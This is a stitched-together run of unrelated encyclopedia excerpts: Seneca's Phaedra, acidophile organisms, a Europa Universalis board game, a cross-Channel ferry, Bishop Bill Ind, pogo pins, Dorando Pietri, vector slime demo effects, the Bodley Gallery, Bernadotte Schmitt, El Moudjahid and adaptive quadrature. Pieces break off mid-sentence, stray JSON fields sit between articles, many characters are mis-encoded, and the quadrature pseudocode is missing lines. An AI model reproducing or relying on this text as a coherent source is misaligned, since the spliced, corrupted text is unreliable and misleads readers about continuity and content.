the palace, and she finds herself pining for the forests and the hunt. Wondering what is causing her desire for the forest glades, she reflects on her mother, Pasipha√´, daughter of Helios , who was cursed to fall in love with a bull and give birth to a monster, the Minotaur. Phaedra wonders if she is as doomed as her mother was. Phaedra's aged nurse interjects that Phaedra should control the passions she feels, for love can be terribly destructive. Phaedra explains that she is gripped by an uncontrollable lust for Hippolytus, and that her passion has defeated her reason. Hippolytus, however, detests women in general and Phaedra in particular. Phaedra declares that she will commit suicide. The nurse begs Phaedra not to end her life and promises to help her in her love, saying: \\"Mine is the task to approach the savage youth and bend the cruel man's relentless will.\\" After the Chorus sings of the power of love, Phaedra goes into an emotional frenzy, and the nurse begs the goddess Diana to soften Hippolytus' heart and make him fall in love with Phaedra. Lines 424‚Äì834 Hippolytus returns from hunting and, seeing Phaedra's nurse, asks her why she looks so sullen. The nurse replies that Hippolytus should \\"show [him]self less harsh\\", enjoy life, and seek the company of women. Hippolytus responds that life is most innocent and free when spent in the wild. Hippolytus adds that stepmothers \\"are no whit more merciful than beasts\\". He finds women wicked and points to Medea as an example. \\"Why make the crime of few the blame of all?\\" the nurse asks. She argues that love can often change stubborn dispositions. Still, Hippolytus maintains his steadfast hatred of womankind. Phaedra hands to her nurse the letter accusing Hippolytus. Phaedra appears, swoons and collapses. Hippolytus wakes her. When he asks why she is so miserable, she decides to confess her feelings. Phaedra subtly suggests that Hippolytus should take his father's place, as Theseus will likely never return from the underworld. Hippolytus agrees, offering to fill his father's shoes while awaiting his return. Phaedra then declares her love for Hippolytus. Aghast, he cries out that he is \\"guilty\\", for he has \\"stirred [his] stepmother to love\\". He then rails against what he perceives as Phaedra's terrible crime. He draws his sword to kill Phaedra, but upon realizing this is what she wants, he casts the weapon away and flees into the forest. \\"Crime must be concealed by crime\\", the nurse decides, and plots with Phaedra to accuse Hippolytus of incestuous desire. Phaedra cries out to the citizens of Athens for help, and accuses Hippolytus of attacking her in lust. The Chorus interjects, praising Hippolytus' beauty but noting that beauty is subject to the wiles of time. The Chorus then condemns Phaedra's wicked scheme. It is then that Theseus appears, newly returned from the underworld. Lines 835‚Äì1280 The nurse informs Theseus that Phaedra has resolved to die and he asks why, especially now that her husband has come back. The nurse explains that Phaedra will tell no one the cause of her grief. Theseus enters the palace and sees Phaedra clutching a sword, ready to slay herself. He asks her why she is in such a state, but she responds only with vague allusions to a \\"sin\\" she has committed. Theseus orders the nurse to be bound in chains and tormented until she confesses her mistress' secret. Phaedra intervenes, telling her husband that she has been raped and that the \\"destroyer of [her] honor\\" is the one whom Theseus would least expect. She points to the sword Hippolytus left behind. Theseus, in a rage, summons his father Neptune to destroy Hippolytus. The Chorus asks the heavens why they do not reward the innocent and punish the guilty and evil. The Chorus asserts that the order of the world has become skewed: \\"wretched poverty dogs the pure, and the adulterer, strong in wickedness, reigns supreme.\\" A Messenger arrives to inform Theseus that Hippolytus is dead. Out of the ocean's depths, a monstrous bull appeared before Hippolytus' horse- drawn chariot. Hippolytus lost control of his terrified horses, and his limbs became entwined in the reins. His body was dragged through the forest, and his limbs were torn asunder. Theseus breaks into tears. Although he wished death upon his son, hearing of it causes him to despair. The Chorus proclaims that the gods most readily target mortals of wealth or power, while \\"the low- roofed, common home ne'er feels [Jove's] mighty blasts\\". Phaedra condemns Theseus for his harshness and turns to Hippolytus' mangled corpse, crying: \\"Whither is thy glorious beauty fled?\\" She reveals that she had falsely accused Hippolytus of her own crime, falls on her sword and dies. Theseus is despondent. He orders that Hippolytus be given a proper burial. Pointing to Phaedra's corpse, he declares: \\"As for her, let her be buried deep in earth, and heavy may the soil lie on her unholy head!\\" Source material The story of the Hippolytus‚ÄìPhaedra relationship is derived from one of several ancient Greek myths revolving around archetypal Athenian hero, Theseus. The Greek playwright Euripides wrote two versions of the tragedy, the lost Hippolytus Veiled and the extant Hippolytus (428 B.C.E.). The generally accepted historical assumption is that Hippolytus Veiled was not favorably received in a tragic competition due to its portrayal of Phaedra as brazen and forward in her pursuit of her stepson. Many historians believe that Euripides wrote Hippolytus in order to correct this characterization, and to present Phaedra as chaste, and suffering at the hands of the gods. While historians believe that Phaedra was heavily influenced by Euripides' Hippolytus, there are several differences in plot and tone.Brockett, p. 43 Literary scholar Albert S. G√©rard states that, unlike the Phaedra of Hippolytus, Seneca's Phaedra is a thoughtful and intelligent character that acknowledges the improper and amoral nature of her feelings towards her stepson, yet still pursues him.G√©rard, pp. 25‚Äì35 In Euripides' iteration of the play, Phaedra is passive in her lustful anguish, and it is the Nurse that informs Hippolytus of Phaedra's love for him. In Seneca's version, Phaedra personally conveys her desires to her stepson. G√©rard claims that by transferring much of the scheming, \\"cynical insights,\\" and \\"pragmatic advice\\" from the Nurse to Phaedra, Seneca implies that Phaedra is responsible for her actions, and she is aware that her behavior deviates from accepted principles of human morality. In another departure from Euripides' Hippolytus, Phaedra, rather than committing suicide immediately after Hippolytus rejects her advances, is filled with remorse after Hippolytus has been killed and stabs herself. G√©rard claims that these plot differences show a historical shift from the Greek \\"shame culture\\" priority of preserving one's reputation, to the Roman \\"guilt culture\\" priority of repentance. Historical context and reception Alexandre Cabanel - Ph√®dre During his life, Seneca (4‚Äì5 B.C.E.‚Äì65 C.E.) was famous for his writings on Stoic philosophy and rhetoric and became \\"one of the most influential men in Rome\\" when his student, Nero, was named emperor in 54 C.E. Phaedra is thought to be one of Seneca's earlier works, most likely written before 54 C.E.Coffey & Mayer, pp. 5‚Äì6 Historians generally agree that Seneca did not intend for his plays to be performed in the public theaters of Rome, but rather privately recited for gatherings of fashionable and educated audiences. Since Phaedra was not meant to be acted, historian F.L. Lucas states that Seneca's writing, \\"tends to have less and less action, and the whole burden is thrown upon the language\\".Lucas, p. 57 The structure and style of Senecan tragedies such as Phaedra have exerted great influence on drama throughout the ages, particularly on tragedy in the time of Shakespeare. Technical devices such as asides and soliloquies, in addition to a focus on the supernatural and the destructive power of obsessive emotions, can all be traced back to Seneca. The influence of Phaedra in particular can further be seen in dramas of 16th and 17th century France with Robert Garnier's Hippolyte (1573) and Racine's Ph√®dre (1677). According to historian Helen Slaney, Senecan tragedy \\"virtually disappeared\\" in the 18th century as drama became more regulated and \\"sensibility supplanted horror\\". Seneca's Phaedra saw a resurgence of influence in the 20th century with productions of Tony Harrison's Phaedra Britannica (1975), Sarah Kane's Phaedra's Love (1996). According to Slaney, today the dramas of Seneca \\"remain a touchstone for creative practitioners seeking to represent the unrepresentable\\". Themes and analysis ;The laws of nature In addition to his work as a dramatist, Seneca was a Stoic philosopher. The Stoics believed that reason and the laws of nature must always govern human behavior. In making the conscious choice to pursue her sinful passion for her stepson, Phaedra disturbs the laws of nature to such a degree that, according to Seneca's Stoic ideology, only her death can restore the cosmic order. Likewise, Hippolytus feels that Phaedra's lust has tainted him, and he does not wish to live in a world that is no longer governed by moral law. Hippolytus does not himself represent Stoic ideals. He denies ordinary human social bonds and isolates himself from society, thus making his moral existence unstable, especially in the face of his stepmother's unnatural advances. ;Animal imagery and hunting The opening scene of Phaedra shows Hippolytus with his men preparing for the hunt. According to scholar Alin Mocanu, Seneca chooses to describe their preparations with vocabulary, \\"that would be appropriate both to a hunt for animals and to an erotic hunt\\". Later in the play, Hippolytus transitions from hunter to prey, as Phaedra becomes the predator in the pursuit of her stepson. Both Phaedra and her nurse describe Hippolytus as if he were a wild animal, referring to him as \\"young beast\\" and \\"ferocious\\". Phaedra, in turn, refers to herself as a hunter: \\"My joy is to follow in pursuit of the startled beasts and with soft hand to hurl stiff javelins.\\" The centrality of hunting to the plot is, furthermore, demonstrated by the fact that Diana, the goddess of the hunt, is the only deity who has an altar on stage, and the altar is important enough to be referenced four times in the course of the play. Stepmothers and mothers In Phaedra, Seneca addresses the pervasive Roman stereotype of the amoral and wicked stepmother. Phaedra is referred to as a stepmother four times throughout the course of the play, each time at a moment of climactic action. This is notable when compared to Euripides' Hippolytus, in which the word stepmother is never used to describe Phaedra. According to scholar Mairead McAuley, \\"Roman obsession with both wicked and sexually predatory stepmother figures indicates a prevailing belief that the stepmaternal role led inherently to feminine lack of control and destructive impulses.\\" It is important to note, however, that Seneca does not represent Phaedra as merely a caricature of the evil stepmother, but paints her in a more sympathetic light by showing her inner conflict and turmoil. Phaedra believes that her unnatural feelings for Hippolytus can be traced back to the transgressions of her own mother, Pasipha√´, who mated with a bull and gave birth to the Minotaur. Phaedra says, \\"I recognize my wretched mother's fatal cures; her love and mine know how to sin in forest depths.\\" The Nurse, however, points out that Phaedra's crime would be even worse, because Phaedra is self-aware and not a victim of fate. The Nurse says, \\"Why heap fresh infamy upon thy house and outsin thy mother? Impious sin is worse than monstrous passion; for monstrous love thou mayest impute to fate, but crime, to character.\\" In the end, Phaedra can be seen to meet a fate similar to that of her mother, for her unnatural lust brings about the creation of the monstrous bull that dismembers Hippolytus.

Eukarya :* Mucor racemosus :* Urotricha :* Dunaliella acidophila Mechanisms of adaptation to acidic environments Most acidophile organisms have evolved extremely efficient mechanisms to pump protons out of the intracellular space in order to keep the cytoplasm at or near neutral pH. Therefore, intracellular proteins do not need to develop acid stability through evolution. However, other acidophiles, such as Acetobacter aceti, have an acidified cytoplasm which forces nearly all proteins in the genome to evolve acid stability. For this reason, Acetobacter aceti has become a valuable resource for understanding the mechanisms by which proteins can attain acid stability. Studies of proteins adapted to low pH have revealed a few general mechanisms by which proteins can achieve acid stability. In most acid stable proteins (such as pepsin and the soxF protein from Sulfolobus acidocaldarius), there is an overabundance of acidic residues which minimizes low pH destabilization induced by a buildup of positive charge. Other mechanisms include minimization of solvent accessibility of acidic residues or binding of metal cofactors. In a specialized case of acid stability, the NAPase protein from Nocardiopsis alba was shown to have relocated acid-sensitive salt bridges away from regions that play an important role in the unfolding process. In this case of kinetic acid stability, protein longevity is accomplished across a wide range of pH, both acidic and basic.

It is a geopolitical strategy game in which players compete as the powers of Europe during the period 1492 to 1792. In 2000, Paradox Interactive released a computerized version, the first in a series of four games. Description This atypically long board game has an official playing time of 6 hours according to the game box, but games can last for weeks; Board Game Geek estimates the playing time to be 15 days. About 1,000 markers are used, as well as two 56 cm √ó 86 cm (22 in √ó 34 in) maps: one for Europe and one for the rest of the world. The English rulebook is 72 pages long. Gameplay The players have extraordinary freedom of choice regarding economics, military, maintenance, discoveries, and colonial investment. One drawback is that there is a lot of calculation and management required during the game regarding computing income, price changes, maintenance and purchases of military resources. Extensions and variants A first official extension was released and introduced new rules for forts and missionaries, as well as a new set of objectives. A second extension has been widely circulated on the internet. It introduced yet another set of rules, such as palaces, including historical monarchs with predefined characteristics and a faster combat system that could divide by ten or more the time for one battle, as well as many new minor countries and counters. It was never published officially. Two more variants have also been circulated: the event rewrite by Risto Marjomaa and the Europa8 version by Pierre Borgnat, Bertrand Asseray, Jean-Yves Moyen and Jean-Christophe Dubacq, which introduces two more players, revised counters and maps, and is not finished yet. Both of these can be obtained for free either by download or by asking the authors. There is also a mailing-list which is quite responsive in suggestions and advice about the rules.

She was the first of three 'Spirit' class ferries built for Townsend Thoresen. Her two sister ships were and . As Spirit of Free Enterprise Spirit of Free Enterprise operated reliably and successfully on Townsend's routes from her delivery in 1980 until the company was bought by P&O; in 1987. In the same year, her identical sister ship Herald of Free Enterprise capsized while leaving Zeebrugge. The design of the ship was not found to be at fault, and after fitting of cameras to allow monitoring of the bow doors from the bridge she continued in service. As Pride of Kent In the aftermath of the sinking of Herald of Free Enterprise, P&O; moved to change the appearance of the fleet. The Townsend red and white hull with light blue funnels was replaced with the P&O; darker blue and white, and the old Townsend \\"Free Enterprise\\" names were replaced. Spirit of Free Enterprise became Pride of Kent in late 1987. In 1991 Pride of Kent was extended in a process often known as \\"Jumboisation\\". The ship was cut in half and a new hull and superstructure section 31 metres in length was inserted amidships, raising her passenger capacity to 1,825 and her car capacity to 460. The work cost ¬£20m and took six months. In 1998 she was renamed P&OSL; Kent following the merger of P&O; European Ferries and Stena Line on the Dover-Calais route, and later \\"P O Kent\\" in August 2002 (following P&O;'s buyout of Stena Line's 40% share in the joint venture). In the spring of 2003 the ship was sold by P&O; after a brief lay-up period in Dunkerque. She has been replaced by another ship again named Pride of Kent, an extensive rebuild of a former freight ferry. As Anthi Marina In 2006 she was named Anthi Marina and operated by GA Ferries between Piraeus, Kos and Rhodes. In addition to the jumboising carried out by P&O; she then had a more conventionally shaped bow in place of her original clamshell doors, and an internal ramp to enable her upper car deck to be used in ports without double-deck linkspans. As most Greek ports lack the linkspans found elsewhere, the ship was usually docked stern-on to the quayside and vehicles loaded via a ramp mounted on the ship. She was laid-up in 2009 due to her owner's financial difficulties and she was scrapped in 2012. Sister ships Three ships were originally built for Townsend Thoresen for the services between Europe and the UK: Herald of Free Enterprise, Spirit of Free Enterprise and Pride of Free Enterprise. Herald of Free Enterprise was scrapped in 1988 after the capsizing at Zeebrugge as Flushing Range. Pride of Free Enterprise was broken up in late 2015. This ship, Spirit of Free Enterprise sailed under a range of names on both English Channel as well as between the Greek islands. She was scrapped in September 2012 as MS Anthi Marina.

Career Ind was ordained deacon in 1966 and priest in 1967. From 1966 to 1971, he was curate of Feltham and from 1971 to 1973 of St Mary's Northolt. In 1973, he became team vicar of Basingstoke, in 1979 Vice-principal of the Aston Training Scheme, in 1982 Director of Ordinands of the Winchester Diocese and member of the Doctrine Commission and in 1984 an honorary canon of Winchester, holding all posts until 1987. He was then Suffragan Bishop of Grantham until 1997, when he was appointed the 14th Bishop of Truro. Ind has been married to Frances Isobel Bramald since 1967 and they have three sons.

On 12 May 2007 he announced to the diocesan synod his intention of retiring on 30 April 2008.Statement by Bill Ind on Truro Diocesan website Apology for the church's role in Cornish massacre In June 2007, Ind said that the massacre of thousands during the vicious suppression of a Cornish Prayer Book Rebellion, more than 450 years ago, was an \\"enormous mistake\\" which the church should be ashamed of. Speaking at a ceremony at Pelynt, acknowledging the \\"brutality and stupidity\\" of the atrocities on behalf of the church, Ind said: \\"I am often asked about my attitude to the Prayerbook Rebellion and in my opinion, there is no doubt that the English Government behaved brutally and stupidly and killed many Cornish people. I don't think apologising for something that happened over 500 years ago helps, but I am sorry about what happened and I think it was an enormous mistake.\\" Ind also urged the church to accept its culpability for a period in history which saw one in ten of the indigenous Cornish population massacred. At the Celtic League's AGM in October 2004 at Perranporth, Cornwall, delegates from the six Celtic countries unanimously backed a motion on the church which included a call for the Church of England to acknowledge \\"its part in provoking and suppressing the 1549 Prayer Book Uprising\\" and \\"for all it has done since 1549 and continues to do to suppress Cornwall's national identity, political freedom, language and culture\\". Ind also said: \\"Everything about Cornwall marks it as a place to be treasured and loved,\\" he said. \\"It has never been an English shire, it has its own language and it reminds us, by its history, of links to Ireland, Wales, Brittany and a Celtic past.\\"\\"Bishop Bill Apologises For Cornish Massacre\\", Western Morning News, June 2007 References * Category:1942 births Category:Alumni of the College of the Resurrection Category:Bishops of Grantham Category:Bishops of Truro Category:20th-century Anglican bishops Category:21st-century Anglican bishops Category:Alumni of the University of Leeds Category:People educated at the Duke of York's Royal Military School Category:Living people ","title":"Bill Ind"},{"id":"8099527","text":"Berkeley Square is a play in three acts by John L.

They are used for their improved durability over other electrical contacts, and the resilience of their electrical connection to mechanical shock and vibration. The name pogo pin comes from the pin's resemblance to a pogo stickthe integrated helical spring in the pin applies a constant normal force against the back of the mating receptacle or contact plate, counteracting any unwanted movement which might otherwise cause an intermittent connection. This helical spring makes pogo pins unique, since most other types of pin mechanisms use a cantilever spring or expansion sleeve. A complete connection path requires a mating receptacle for the pin to engage, which is termed a target or land. A pogo target consists of a flat or concave metal surface, which unlike the pins, has no moving parts. Targets may be separate components in the complete connector assembly, or in the case of printed circuit boards, simply a plated area of the board. Spring-loaded pins are precision parts fabricated with a turning and spinning process which does not require a mold, thus allowing the production of smaller quantities at a lower cost.  Structure  Exploded diagram showing components of a standard pogo pin A basic spring-loaded pin consists of 3 main parts: a plunger, barrel, and spring. When force is applied to the pin, the spring is compressed and the plunger moves inside the barrel. The shape of the barrel retains the plunger, stopping the spring from pushing it out when the pin is not locked in place. In the design of electrical contacts, a certain amount of friction is required to hold a connector in place and retain the contact finish. However, high friction is undesirable because it increases stress and wear on the contact springs and housings. Thus, a precise normal force, typically around 1 newton, is required to generate this friction. Since a spring-loaded pin needs to have a slight gap between the plunger and barrel so that it can slide easily, momentary disconnections can happen when there is vibration or movement. In order to counter this, the plunger usually has a small tilt to ensure a continuous connection. Many manufacturers have created their own proprietary variations on this design, most commonly by varying the interface between the plunger and spring. For example, a ball may be added between the two components, or the plunger may have an angled or countersunk tip. Various pogo pin designs  Materials  The plunger and barrel of pogo pins usually use brass or copper as a base material on which a thin layer of nickel is applied. As common in electrical connectors, manufacturers often apply a gold plating that improves the durability and contact resistance. The springs are usually made of copper alloys or spring steel.  Applications  Some spring- loaded connectors, and the disassembled pogo pins inside them Spring-loaded connectors are used for a wide variety of applications, in both industrial and consumer electronics: * Board-to-board connectors (usually permanent) * Ingress-protected connectors in consumer devices, e.g. smart watches, rugged computers * Battery terminals on laptops * Magnetic charging or signal connectors, e.g. laptop docks and chargers * High-frequency connectors, e.g. antennas, monitor connectors * Printed circuit board testing * Integrated circuit testing * In-circuit testing * Battery testing * Other electronics testing  Connector arrangement  When pogo pins are used in a connector, they are usually arranged in a dense array, connecting many individual nodes of two electrical circuits. They are commonly found in automatic test equipment in the form of a bed of nails, where they facilitate the rapid, reliable connection of the devices under test (DUTs). In one extremely high- density configuration, the array takes the form of a ring containing hundreds or thousands of individual pogo pins; this device is sometimes referred to as a pogo tower. They can also be used for more permanent connections, for example, in the Cray-2 supercomputer. When used in the highest-performance applications, pogo pins must be very carefully designed to allow not only high reliability across many mating/unmating cycles but also high-fidelity transmission of the electrical signals. The pins themselves must be hard, yet plated with a substance (such as gold) that provides for reliable contact. Within the body of the pin, the plunger must make good electrical contact with the body lest the higher-resistance spring carry the signal (along with the undesirable inductance that the spring represents). The design of pogo pins to be used in matched-impedance circuits is especially challenging; to maintain the correct characteristic impedance, the pins are sometimes arranged with one signal-carrying pin surrounded by four, five, or six grounded pins. Pogo pins connecting logic modules of the Cray-2 supercomputer  Combination with magnets  Spring-loaded connectors may be combined with magnets to form a strong and reliable connectiona technique which has been employed extensively for consumer electronics such as 2-in-1 PCs and high-frequency data transfer. One notable example of this is Apple's MagSafe connector.US patent US7311526B2, \\"Magnetic connector for electronic device\\", published 25 December 2007, assigned to Apple Inc.

He finished first in the marathon at the 1908 Summer Olympics in London but was subsequently disqualified. Biography Early years Pietri was born in Mandrio, a frazione of Correggio, but spent his youth in Carpi (Emilia-Romagna region). Here he worked as a shop-boy at a confectionery shop. He was 1.59 m (5 ft., 2¬Ω in.) tall. In September 1904 the most famous Italian runner of the time, Pericle Pagliani, took part in a race in Carpi. According to tradition, Pietri was attracted by the event and, still wearing his work clothes, ran to the finish ahead of Pagliani. A few days later Pietri d√©buted in a distance race, finishing second in the 3,000 m of Bologna. The following year he achieved his first international success, winning the 30 km in Paris. On 2 April 1906 Pietri won the qualifying marathon for the Olympic Games to be held in Athens that same year. In the Olympic race he retired due to intestinal illness when he was leading by 5 minutes. In 1907 he won the Italian championships. He was by then the undisputed leader of Italian long distance races from 5000 metres to marathon distance. 1908 Olympics The arrival of Dorando Pietri at the finish of the 1908 Olympics marathon, assisted by Dr. Michael Joseph Bulger (right) Dorando Pietri trained hard for the 1908 Olympics in London. In a race in Carpi he ran in 2 hours and 38 minutes, an extraordinary result for the times. The marathon, which was to take place on 24 July 1908, started with 56 competitors, including Pietri and fellow Italian Umberto Blasi. It began at 2:33pm. The weather was particularly hot by British summer standards. The London course measured ; the distance would later become the official marathon length from 1921. Pietri began his race at a rather slow pace, but in the second half of the course began a powerful surge moving him into second position by the mark, 4 minutes behind South African Charles Hefferon. When he knew that Hefferon was in crisis, Pietri further increased his pace, overtaking him at the mark. The effort took its toll and with only two kilometres to go, Pietri began to feel the effects of extreme fatigue and dehydration. When he entered the stadium, he took the wrong path and when umpires redirected him, he fell down for the first time. He got up with their help, in front of 75,000 spectators. He fell four more times, and each time the umpires helped him up. In the end, though totally exhausted, he managed to finish the race in first place. Of his total time of 2h 54min 46s, ten minutes were needed for that last 350 metres. Second was American Johnny Hayes, with a time of 2h 55min 18s. The American team immediately lodged a complaint against the help Pietri received from the umpires. The complaint was accepted and Pietri was disqualified and removed from the final standings of the race. International celebrity As a compensation for the missing medal, Queen Alexandra gave him a gilded silver cup. Arthur Conan Doyle had been commissioned by the Daily Mail to write a special report about the race. He was very impressed by the effort of the Italian at the stadium, which he commented with the words: Pietri (second from right) with his competitors of the Argentine marathon of 1910, which he won Conan Doyle proposed the Daily Mail to start a subscription to raise money and help Pietri to open a bakery in his native town. The fund reached the considerable sum of 300 pounds (), to which the same Conan Doyle contributed the initial 5 pounds (). Pietri suddenly became an international celebrity. Composer Irving Berlin dedicated a song to him entitled \\"Dorando\\" and Pietri received requests to participate in exhibition races in the United States. On 25 November 1908, in Madison Square Garden, New York a race between Hayes and Pietri was organized. Pietri won the race as well as a second similar race on 15 March 1909. Pietri won 17 of the 22 races on his tour of America. He returned to Italy in May 1909 and continued racing professionally in his native country and abroad for two more years. He ran his final marathon in Buenos Aires, on 24 May 1910, where he achieved his personal best of 2h 38min 48:2s. Pietri's last race in Italy was a race held in Parma on 3 September 1911, which he won. He also won his very last race, this time in Gothenburg (Sweden), in October of the same year. He was 26 at the time. In three years as a professional runner he earned 200,000 lire in prize money alone, an enormous sum for the time. He invested his earnings in a hotel he opened in collaboration with his brother. He was not as successful an entrepreneur as he was athlete, and the hotel went bankrupt. He moved to Sanremo, where he directed a car workshop. Pietri lived in Sanremo until his death, of a heart attack, at the age of 56. In popular culture Il sogno del maratoneta is an Italian book and TV movie about Pietri's run.

The techniques appear in programming demos.  Synopsis  A geometric object exposed to vector slime is usually defined by vertices and faces in two or three dimensions. In the process of deformation, each vertex in the original shape undergoes one or more linear transformations (usually rotation or translation), defined as a function of the vertex' position in space (usually a function of the magnitude of the vector) and time. The desired result is an animated geometric object behaving in a harmonic way, creating some degree of illusion of physical realism. Older vector slime implementations kept old copies of the rendering result from simple vector objects in RAM, and selected scan-lines from the different buffers in order to make a time-displacement illusion over the y-axis.  Appearance  Depending on variances in implementation, vector slime can approximate an array of physical properties. A traditional approach is to let the linear transformation vary as a smooth function of time minus the magnitude of the vector in question. This creates the illusion that there is a force applied to the origin of the object space (where the object is usually centered), and the rest of the object's body reacts as a soft body, as each vertex reacts to a change in the force delayed by the distance to the origin. Applied to a spikeball (a sphere with extracted arms), the object could resemble the behaviour of a soft squid-like animal. Applied to a cube, the object would appear as a cubic piece of jelly propelled by a gyro force from the inside.  Areas of application  Although the classical vector slime algorithms are far from an attempt at correct physical modelling, the result can, under certain conditions, trick the viewer into believing that there is some sophisticated physical simulation involved. The effect has therefore grown quite popular in the demoscene to create impressive visual effects at relatively low computational cost. Interactive vector slime implementations can also eventually be found in computer games as a substitute for a more correct physical simulation algorithm.

The Bodley specialized in contemporary and modern art. David Mann was director of the gallery during its heyday and Mr. and Mrs. Raymond Braun (a.k.a. Georgie Duffee), were the owners. Upper East Side haven for new and modern art Several of Andy Warhol's earliest exhibitions in New York were at the Bodley during the 1950s, starting with two in 1956. David Mann, the Bodley's director, had previously been manager of the Hugo Gallery, assistant to director Alexander Iolas, when the Hugo mounted Warhol's first solo exhibition in 1952 . Apparently David Mann was not the first director of the Bodley Gallery, which seems to have existed already in the late 1940s; but the period of David Mann's directorship includes the most important years of the Bodley's existence, judging from exhibition catalog records and other published historical material. According to at least one source, Mann was still director of the Bodley as late as 1981. Max Ernst had a major solo exhibition at the Bodley Gallery in 1961, after his works were exhibited together with those of Yves Tanguy in a 1960 Bodley Gallery show. Also in 1960, Roberto Matta had a solo show at the Bodley, entitled \\"Matta, from 1942 to 1957\\". Many other notable artists had showings at the Bodley under Mr. Mann's directorship, including Victor Brauner, Charles Bunnell, Clarence Holbrook Carter, Thomas Chimes, Louis Delsarte, Jane Frank, Charlotte Gilbertson, Eugenio Granell, Shirley Hendrick, Hank Laventhol, Mina Loy, Larry Rivers, Ethel Schwabacher, Bettina Shaw-Lawrence, Thomas Sills, and Ahmed Yacoubi. Although the gallery emphasized the work of living artists, exhibits were not limited to such works - as evidenced by its showing of paintings by Tanguy in 1960, and by the exhibition catalogue listed below for a 1970 show including works of Ren√© Magritte, who had died in 1967. A 1971 exhibition entitled \\"Modern Master Drawings\\" included works by Klee, L√©ger, Matisse, and Picasso. The Bodley exhibition record, as evidenced by listed catalogues, shows a general preponderance of surrealists (including Jorge Noceda Sanchez) among the artists featured. Early Warhol exhibitions at the Bodley Gallery *\\"Drawings for a Boy-Book\\" : February 14 - March 3, 1956 *\\"The Golden Slipper Show or Shoes Shoe in America\\" : December 3‚Äì22, 1956 *\\"A Show of Golden Pictures\\" : December 2‚Äì24, 1957 *\\"Wild Raspberries\\" : December 1‚Äì24, 1959 Location According to many sources (including warholstars.com and the 1961 Max Ernst exhibition catalogue listed below), the Bodley Gallery was located (through the 1950s and until at least November 1963, according to the catalogue for a 1963 Jane Frank show) at 223 East 60th Street, in Manhattan's wealthy Upper East Side neighborhood. This would place it between Second and Third Avenues. Presently the storefront is occupied by Dejavu Boutique & Gallery, a luxury fashion boutique selling mostly European clothing. To acknowledge the building‚Äôs past, the boutique preserved the 2nd floor of the space as an Art Gallery to showcase artwork by established artists and the interior is lined with d√©cor by Mackenzie-Childs. As of no later than April 1964, the Bodley Gallery had relocated to 787 Madison Avenue (an ad on page 15 of the April 1964 issue of Art in America gives this address). This put it in an even more exclusive section of the Upper East Side, at Madison and 67th Street. That is now the address of Jacadi, which sells upscale children's clothing. A third address, 1063 Madison Avenue (at 80th Street), seems to have been in effect by about 1975, if not earlier (but no earlier than 1967; see references and external links). 1063 Madison is now the address of a women's fashion boutique called Agnes B. It is possible, of course, that the Bodley owned or rented more than one location simultaneously.

Lieber, \\"The new history of World War I and what it means for international relations theory.\\" International Security 32.2 (2007): 155-191. online Biography Schmitt received his Master of Arts from the University of Oxford and his PhD from the University of Wisconsin‚ÄìMadison. In 1916 he gained notice with England and Germany, 1740‚Äì1914. His book The Coming of the War, 1914 (published in 1930) won him the 1930 George Louis Beer Prize of the American Historical Association and the 1931 Pulitzer Prize for History. This work, for which he remains best known, took issue with the equally prominent study of the origins of the First World War published two years earlier by Sidney Fay (for which its author had also won a Beer Prize). In contrast to Fay's argument that Serbia and Russia were culpable, Schmitt insisted that Germany had indeed been largely responsible for the catastrophe. The debate between the \\"orthodox\\" school represented by Schmitt, Luigi Albertini and Pierre Renouvin, and the \\"revisionist\\" school of Fay, Harry Elmer Barnes and others that shifted blame from the Central Powers to the Allies, dominated scholarship on the \\"war- guilt\\" question until the publication of Fritz Fischer's Griff nach der Weltmacht (Germany's Aims in the First World War) (1961), which reopened the debate with a fresh approach by blaming Germany's prewar ambitions. Schmitt was the first editor of the Journal of Modern History, serving from 1929 to 1946. In 1937 Schmitt published The Annexation of Bosnia, 1908‚Äì1909. In 1960, he was President of the American Historical Association. He died in 1969.

Since the FLN was voted out of power in 1991, the newspaper is no longer affiliated with that party. History and profile El Moudjahid was originally conceived as an FLN guerrilla information bulletin during the 1954-62 Algerian War, circulated among resistance fighters. Its name, a French transliteration of the Arabic ŸÖÿ¨ÿßŸáÿØ (Mujahid), means \\"holy warrior\\", which the FLN called its fighters. Noted writer, activist and psychiatrist Frantz Fanon wrote for the newspaper during his life. After the war, in 1962 this became the chief newspaper of Algeria. It served as a propaganda organ for the single-party FLN government. When Algeria opened up its closed system in 1988 and allowed for the publication of independent newspapers, El Moujahid continued to publish. Today it is a state newspaper, but its ties with the FLN were cut after the party was voted out of power in the 1991 elections. It is published daily, except Fridays, which in Algeria is the weekly holiday. The paper's headquarters are on the Algiers seafront, near the parliament and central bank.

Generally, adaptive algorithms are just as efficient and effective as traditional algorithms for \\"well behaved\\" integrands, but are also effective for \\"badly behaved\\" integrands for which traditional algorithms may fail. General scheme Adaptive quadrature follows the general scheme 1\\\\. procedure integrate ( f, a, b, \\\\tau ) 2\\\\.

Q = integrate(f, a, m, \\\\tau/2) + integrate(f, m, b, \\\\tau/2) 7\\\\. endif 8\\\\. return Q An approximation Q to the integral of f(x) over the interval [a,b] is computed (line 2), as well as an error estimate \\\\varepsilon (line 3). If the estimated error is larger than the required tolerance \\\\tau(line 4), the interval is subdivided (line 5) and the quadrature is applied on both halves separately (line 6). Either the initial estimate or the sum of the recursively computed halves is returned (line 7). The important components are the quadrature rule itself :Q \\\\approx \\\\int_a^bf(x)\\\\,\\\\mbox{d}x , the error estimator :\\\\varepsilon \\\\approx \\\\left|Q - \\\\int_a^bf(x)\\\\,\\\\mbox{d}x\\\\right, and the logic for deciding which interval to subdivide, and when to terminate. There are several variants of this scheme. The most common will be discussed later. Basic rules The quadrature rules generally have the form :Q_n \\\\quad = \\\\quad \\\\sum_{i=0}^n w_if(x_i) \\\\quad \\\\approx \\\\quad \\\\int_a^b f(x)\\\\,\\\\mbox{d}x where the nodes x_i and weights w_i are generally precomputed. In the simplest case, Newton‚ÄìCotes formulas of even degree are used, where the nodes x_i are evenly spaced in the interval: :x_i = a + \\\\frac{i}{n}(b - a). When such rules are used, the points at which f(x) has been evaluated can be re-used upon recursion: :Image:Newton-Cotes re-use.png A similar strategy is used with Clenshaw‚ÄìCurtis quadrature, where the nodes are chosen as :x_i = \\\\cos\\\\left( \\\\frac{2i}{n}\\\\pi \\\\right). Or, when Fej√©r quadrature is used, :x_i = \\\\cos\\\\left( \\\\frac{2(i+0.5)}{n+1}\\\\pi \\\\right). Other quadrature rules, such as Gaussian quadrature or Gauss-Kronrod quadrature, may also be used. An algorithm may elect to use different quadrature methods on different subintervals, for example using a high-order method only where the integrand is smooth. Error estimation Some quadrature algorithms generate a sequence of results which should approach the correct value. Otherwise one can use a \\"null rule\\" 